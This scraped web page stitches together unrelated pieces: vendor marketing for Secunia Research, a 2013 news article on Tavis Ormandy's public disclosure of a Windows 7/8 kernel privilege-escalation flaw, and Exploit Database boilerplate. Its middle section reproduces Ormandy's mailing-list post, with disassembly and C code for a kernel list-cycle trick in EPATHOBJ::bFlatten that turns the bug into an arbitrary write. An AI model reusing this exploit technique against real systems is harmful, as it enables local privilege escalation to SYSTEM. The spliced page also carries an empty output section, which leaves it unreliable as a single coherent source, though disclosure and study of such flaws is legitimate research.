How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

A Google engineer has once again disclosed a Windows flaw. In a [Full Disclosure posting to the SecLists mailing list](http://seclists.org/fulldisclosure/2013/May/91), Tavis Ormandy — an Information Security Engineer at Google — details a vulnerability in Windows 7 and Windows 8 that can be exploited by local users to gain escalated privileges. Security firm [Secunia notes](http://secunia.com/advisories/53435/) that the issue is "less critical" than other flaws as it's not a remotely exploitable one. Nevertheless, it appears that Ormandy has taken the full disclosure approach, stating he doesn't have "time to work on silly Microsoft code," rather than Microsoft's preferred responsible disclosure route that calls for vulnerabilities to be reported privately.

Ormandy previously revealed a serious vulnerability in Windows XP's Help and Support Center that allowed attackers to compromise machines using specially crafted websites before Microsoft had patched the bug. [Google engineers regularly report flaws in Microsoft software](http://www.theverge.com/2013/2/13/3983846/googlers-found-over-50-percent-of-the-bugs-in-microsofts-massive-update), recently discovering over 50 percent of bugs in one of its biggest "Patch Tuesday" monthly security updates ever. Some security researchers have previously [branded Ormandy "irresponsible,"](http://nakedsecurity.sophos.com/2010/06/15/tavis-ormandy-pleased-website-exploits-microsoft-zeroday/) but his motives may be related to Microsoft's "interesting experience" of dealing with vulnerabilities. In a [blog post days before](http://blog.cmpxchg8b.com/2013/05/introduction-to-windows-kernel-security.html) his most recent disclosure, Ormandy claims Microsoft is "often very difficult to work with," advising researchers to speak to the software maker anonymously. "Microsoft treat vulnerability researchers with great hostility," he says.

"Vulnerability researchers should work closely with Microsoft..."

Graham Cluley, a senior technology consultant at [Sophos](http://www.sophos.com/en-us/), disputes Ormandy's claims. "Generally, Microsoft's security team does an excellent job," says Cluley in an email to *The Verge*. "Vulnerability researchers should work closely with Microsoft to fix problems responsibly, rather than risking assisting malicious hackers." Whether or not Ormandys approach is reasonable is debatable, but Microsoft says it's investigating. "We are aware of claims regarding a potential issue affecting Microsoft Windows and are investigating," said a spokesperson in a [statement issued to Computerworld](http://www.computerworld.com/s/article/9239477/Google_engineer_bashes_Microsoft_s_handling_of_security_researchers_discloses_Windows_zero_day?taxonomyId=85&pageNumber=1). "We will take the appropriate action to protect our customers."

**Vulnerable App:**

```
I'm quite proud of this list cycle trick, here's how to turn it into an
arbitrary write.

First, we create a watchdog thread that will patch the list atomically
when we're ready. This is needed because we can't exploit the bug while
HeavyAllocPool is failing, because of the early exit in pprFlattenRec:

.text:BFA122B8                 call newpathrec              ; EPATHOBJ::newpathrec(_PATHRECORD * *,ulong *,ulong)
.text:BFA122BD                 cmp     eax, 1               ; Check for failure
.text:BFA122C0                 jz      short continue
.text:BFA122C2                 xor     eax, eax             ; Exit early
.text:BFA122C4                 jmp     early_exit

So we create a list node like this:

PathRecord->Next    = PathRecord;
PathRecord->Flags   = 0;

Then EPATHOBJ::bFlatten() spins forever doing nothing:

BOOL __thiscall EPATHOBJ::bFlatten(EPATHOBJ *this)
{
    /* ... */

    for ( ppr = ppath->pprfirst; ppr; ppr = ppr->pprnext )
    {
      if ( ppr->flags & PD_BEZIER )
      {
        ppr = EPATHOBJ::pprFlattenRec(pathobj, ppr);
      }
    }

    /* ... */
}

While it's spinning, we clean up in another thread, then patch the thread (we
can do this, because it's now in userspace) to trigger the exploit. The first
block of pprFlattenRec does something like this:

    if ( pprNew->pprPrev )
      pprNew->pprPrev->pprnext = pprNew;

Let's make that write to 0xCCCCCCCC.

DWORD WINAPI WatchdogThread(LPVOID Parameter)
{

    // This routine waits for a mutex object to timeout, then patches the
    // compromised linked list to point to an exploit. We need to do this.
    LogMessage(L_INFO, "Watchdog thread %u waiting on Mutex () %p",
                       GetCurrentThreadId(),
                       Mutex);

    if (WaitForSingleObject(Mutex, CYCLE_TIMEOUT) == WAIT_TIMEOUT) {
        // It looks like the main thread is stuck in a call to FlattenPath(),
        // because the kernel is spinning in EPATHOBJ::bFlatten(). We can clean
        // up, and then patch the list to trigger our exploit.
        while (NumRegion--)
            DeleteObject(Regions[NumRegion]);

        LogMessage(L_ERROR, "InterlockedExchange(%p, %p);", &PathRecord->next, &ExploitRecord);

        InterlockedExchangePointer(&PathRecord->next, &ExploitRecord);

    } else {
        LogMessage(L_ERROR, "Mutex object did not timeout, list not patched");
    }

    return 0;
}

    PathRecord->next    = PathRecord;
    PathRecord->prev    = (PVOID)(0x42424242);
    PathRecord->flags   = 0;

    ExploitRecord.next  = NULL;
    ExploitRecord.prev  = 0xCCCCCCCC;
    ExploitRecord.flags = PD_BEZIERS;

Here's the output on Windows 8:

Demo code attached. I have a working exploit that grants SYSTEM on all
currently supported versions of Windows. Code is available on request to
students from reputable schools.

If nobody else on the list can figure out the final details, then I've
lost faith in the next generation ;)

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
